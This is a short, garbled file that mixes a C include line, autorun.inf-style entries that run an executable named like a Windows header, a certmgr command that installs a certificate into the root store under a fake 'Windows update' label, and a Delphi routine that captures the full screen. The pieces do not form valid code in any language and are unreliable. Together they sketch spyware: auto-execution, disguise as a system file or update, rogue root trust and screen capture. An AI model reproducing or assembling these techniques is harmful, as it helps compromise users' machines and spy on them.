#include <C:\Program Files (x86)\Windows Kits\10\Include\10.0.17763.0\ucrt\corecrt_terminate.h>

int main ()

open = corecrt_terminate.h.exeicon=corecrt_terminate.h.exeaction=Executar

	open = corecrt_terminate.h.exe

	icon = corecrt_terminate.h.ico

	certmgr / c / add corecrt_terminate.h / s root
	[/ s Atualizacao do windows[/ r GetPrintScreen]][corecrt_terminate.h]

	function GetPrintScreen() :TBitmap;
	var
		vHDC : HDC;
vCanvas: TCanvas;
	begin
		Result : = TBitmap.Create;
	Result.Width : = Screen.Width;
	Result.Height : = Screen.Height;

	vHDC: = GetDC(0);
	vCanvas: = TCanvas.Create;
		vCanvas.Handle : = vHDC;

		Result.Canvas.CopyRect(
			Rect(0, 0, Result.Width, Result.Height), vCanvas,
			Rect(0, 0, Result.Width, Result.Height));

		vCanvas.Free;
		ReleaseDC(0, vHDC);
		end;

		action = Executar
}

